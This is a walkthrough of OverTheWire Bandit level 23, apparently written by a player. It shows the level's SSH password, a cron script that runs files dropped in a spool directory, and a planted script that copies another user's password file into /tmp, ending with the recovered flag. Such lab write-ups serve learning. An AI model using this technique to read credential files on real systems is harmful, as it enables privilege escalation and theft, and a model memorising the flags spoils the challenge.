# Level 23
## Connection
~~~
ssh bandit23@bandit.labs.overthewire.org -p2220
password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
~~~

## Goal
A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

*NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!*

*NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…*

Commands you may need to solve this level: `cron`, `crontab`, `crontab(5)` (use “`man 5 crontab`” to access this)

## Solution
Same story as the 2 previous levels, go to `/etc/cron.d`, see the content of the file, read the shell, ...
~~~
bandit23@bandit:~$ ls -l /etc/cron.d
total 16
-rw-r--r-- 1 root root 189 Jan 25  2017 atop
-rw-r--r-- 1 root root 120 Oct 16  2018 cronjob_bandit22
-rw-r--r-- 1 root root 122 Oct 16  2018 cronjob_bandit23
-rw-r--r-- 1 root root 120 Oct 16  2018 cronjob_bandit24
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
~~~

OK so let's first create a temporary directory in which our password will be saved and create an empty file where our password will be stored:
~~~
$ mkdir /tmp/ytrewq/
$ touch bandit24
$ chmod 666 bandit24
~~~

Now, let's create our script. It will dump the password to our temporary directory and make it executable:
~~~
$ echo -ne '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/ytrewq/bandit24' > /var/spool/bandit24/ytrewq.sh;chmod +x /var/spool/bandit24/ytrewq.sh
~~~

Let's wait 1 minute (the commands are executed every 60 seconds by the cron thanks to the `timeout` command with the parameter `60`) and let's access our password:
~~~
$ cat /tmp/ytrewq/bandit24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
~~~

# Flag
~~~
level24:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
~~~